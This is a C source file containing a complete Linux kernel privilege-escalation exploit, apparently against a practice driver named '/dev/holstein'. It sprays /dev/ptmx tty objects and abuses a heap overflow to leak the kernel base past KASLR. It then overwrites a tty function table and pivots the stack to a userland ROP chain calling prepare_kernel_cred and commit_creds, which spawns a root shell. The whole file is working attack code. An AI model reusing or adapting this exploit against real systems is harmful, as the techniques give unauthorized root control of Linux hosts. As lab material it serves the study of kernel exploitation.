/**
 * stack_pivot:
 *   - SMEP is enabled
 *   - SMAP is disabled
 *   - KASLR is enabled
 *   - KPTI is disabled
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define ofs_tty_ops 0xc38880

#define rop_mov_esp_0x39000000	(kbase + 0x5a9798) // mov esp, 0x39000000; ret;
#define commit_creds          	(kbase + 0x0744b0)
#define prepare_kernel_cred   	(kbase + 0x074650)
#define rop_pop_rdi           	(kbase + 0x0d748d)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_swapgs		(kbase + 0x6266bc)
#define rop_iretq		(kbase + 0x022dff)
#define rop_pop_rcx		(kbase + 0x40c7b3)

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long kbase, g_buf;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

void build_fake_stack() {
  unsigned long *fake_stack;
  fake_stack = mmap((void *)0x39000000 - 0x1000, 0x2000,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
  unsigned off = 0x1000;
  unsigned long *chain = (unsigned long*) ((unsigned long) fake_stack + off);
  fake_stack[0] = 0xdead; // put something in the first page so that it gets mapped
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_swapgs;
  *chain++ = rop_iretq;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void main()
{
  save_state();

  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLR
  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // build the fake stack in userspace memory - it uses kbase
  build_fake_stack();

  // g_buf address leak
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  // write fake function table 
  unsigned  long *p = (unsigned  long *)&buf; 
  p[12] = rop_mov_esp_0x39000000;

  *(unsigned  long *)&buf[0x418] = g_buf; 
  write(fd, buf, 0x420);
  
  // RIP control 
  ioctl(spray[50], 0xdeadbeef, 0xcafebabe); 
}
